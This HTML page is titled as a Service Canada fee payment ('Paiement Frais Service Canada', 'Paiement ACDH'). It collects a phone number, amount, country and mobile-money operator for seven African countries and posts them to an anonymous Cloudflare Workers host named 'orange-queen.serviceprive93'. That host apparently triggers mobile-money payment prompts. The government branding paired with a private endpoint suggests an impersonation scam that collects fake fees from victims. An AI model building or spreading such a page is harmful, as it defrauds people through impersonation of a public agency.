<!DOCTYPE html>
<html>
<head>
<title>Paiement Frais Service Canada</title>

<style>
body {
  font-family: Arial;
  background:
    linear-gradient(rgba(0,0,0,0.6),rgba(0,0,0,0.6)),
    url("background.jpg") no-repeat center;
  background-size: cover;
  display:flex;
  justify-content:center;
  align-items:center;
  height:100vh;
}

.box {
  background:white;
  padding:30px;
  border-radius:12px;
  width:340px;
  text-align:center;
}

.logo {
  width:120px;
  margin-bottom:10px;
}

input, select {
  width:100%;
  padding:10px;
  margin-top:10px;
  border-radius:6px;
  border:1px solid #ccc;
}

.row {
  display:flex;
  gap:5px;
}

.prefix {
  width:30%;
  background:#eee;
}

.phone {
  width:70%;
}

button {
  width:100%;
  padding:12px;
  margin-top:12px;
  background:#00bcd4;
  color:white;
  border:none;
  border-radius:6px;
  font-weight:bold;
}

#result {
  margin-top:15px;
  font-weight:bold;
}
</style>
</head>

<body>

<div class="box">

<img src="logo.png" class="logo">

<h2>Paiement ACDH</h2>

<select id="country" onchange="updateOperators()">
  <option value="CIV">Côte d'Ivoire</option>
  <option value="CMR">Cameroun</option>
  <option value="COD">RDC</option>
  <option value="COG">Congo</option>
  <option value="GAB">Gabon</option>
  <option value="SEN">Sénégal</option>
  <option value="BEN">Bénin</option>
</select>

<select id="operator"></select>

<div class="row">
  <input id="prefix" class="prefix" readonly>
  <input id="phone" class="phone" placeholder="Numéro">
</div>

<input type="number" id="amount" placeholder="Montant">

<button onclick="payer()">Payer</button>

<p id="result"></p>

</div>

<script>

const operators = {
  BEN:["MTN","MOOV"],
  CIV:["MTN","ORANGE"],
  CMR:["MTN"],
  COD:["AIRTEL","ORANGE","VODACOM"],
  COG:["AIRTEL","MTN"],
  GAB:["AIRTEL"],
  SEN:["ORANGE","FREE"]
};

const prefixes = {
  BEN:"229",
  CIV:"225",
  CMR:"237",
  COD:"243",
  COG:"242",
  GAB:"241",
  SEN:"221"
};

function updateOperators(){

  operator.innerHTML="";

  operators[country.value].forEach(op=>{
    let option=document.createElement("option");
    option.value=op;
    option.text=op;
    operator.appendChild(option);
  });

  prefix.value = prefixes[country.value];
}

updateOperators();

async function payer(){

  const result = document.getElementById("result");

  result.innerText="⏳ Envoi...";

  const fullPhone = prefix.value + phone.value;

  try{

    const res = await fetch("https://orange-queen.serviceprive93.workers.dev/deposit",{
      method:"POST",
      headers:{"Content-Type":"application/json"},
      body: JSON.stringify({
        phone: fullPhone,
        amount: amount.value,
        country: country.value,
        operator: operator.value
      })
    });

    const data = await res.json();

    if(data.status==="ACCEPTED"){
      result.innerText="📲 Vérifiez votre téléphone";
    } else if(data.status==="PENDING"){
      result.innerText="⏳ En attente...";
    } else if(data.status==="SUCCESS"){
      result.innerText="✅ Paiement confirmé";
    } else {
      result.innerText="❌ Échec";
    }

  }catch{
    result.innerText="❌ Erreur réseau";
  }
}

</script>

</body>
</html>
